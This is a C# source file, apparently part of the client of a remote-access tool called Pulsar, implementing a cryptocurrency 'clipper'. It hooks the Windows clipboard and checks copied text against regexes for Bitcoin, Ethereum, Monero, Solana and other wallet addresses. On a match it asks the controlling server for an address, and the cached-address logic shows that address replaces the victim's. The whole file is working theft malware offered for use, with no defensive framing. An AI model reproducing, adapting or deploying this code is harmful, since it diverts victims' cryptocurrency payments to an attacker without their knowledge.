using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using System.Diagnostics;

namespace Pulsar.Client.User
{
    // do some hacker stuff and hooking and it'll monitor whenevrr client copies
    internal class ClipboardChecker : NativeWindow, IDisposable
    {
        private readonly PulsarClient _client;
        private readonly List<Tuple<string, Regex>> _regexPatterns;
        
        private const int WM_CLIPBOARDUPDATE = 0x031D;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

        public ClipboardChecker(PulsarClient client)
        {
            _client = client;
            _regexPatterns = new List<Tuple<string, Regex>>
            {
                // the regex is made by chatgpt so like idk if they ALWAYS work, but they should

                new Tuple<string, Regex>("BTC", new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$")),      // BTC regex
                new Tuple<string, Regex>("LTC", new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$")),        // LTC regex
                new Tuple<string, Regex>("ETH", new Regex(@"^0x[a-fA-F0-9]{40}$")),                // ETH regex
                new Tuple<string, Regex>("XMR", new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")), // XMR regex
                new Tuple<string, Regex>("SOL", new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$")),      // SOL regex
                new Tuple<string, Regex>("DASH", new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$")),       // DASH regex
                new Tuple<string, Regex>("XRP", new Regex(@"^r[0-9a-zA-Z]{24,34}$")),              // XRP regex
                new Tuple<string, Regex>("TRX", new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$")),        // TRX regex
                new Tuple<string, Regex>("BCH", new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"))  // BCH regex

            };
            this.CreateHandle(new CreateParams());
            AddClipboardFormatListener(this.Handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                ClipboardCheck();
            }

            base.WndProc(ref m);
        }

        private void ClipboardCheck()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    string clipboardText = Clipboard.GetText();

                    // If the copied address is already the clipped address, updating the clipboard with the same address will be
                    // a waste of resources for both the server and client; it may also cause undefined behavior.
                    if (!Pulsar.Client.Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText)) {
                        foreach (var pattern in _regexPatterns)
                        {
                            if (pattern.Item2.IsMatch(clipboardText))
                            {
                                _client.Send(new DoGetAddress { Type = pattern.Item1 });
                                break;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (this.Handle != IntPtr.Zero)
                {
                    RemoveClipboardFormatListener(this.Handle);
                    this.DestroyHandle();
                }
            }
        }
    }
}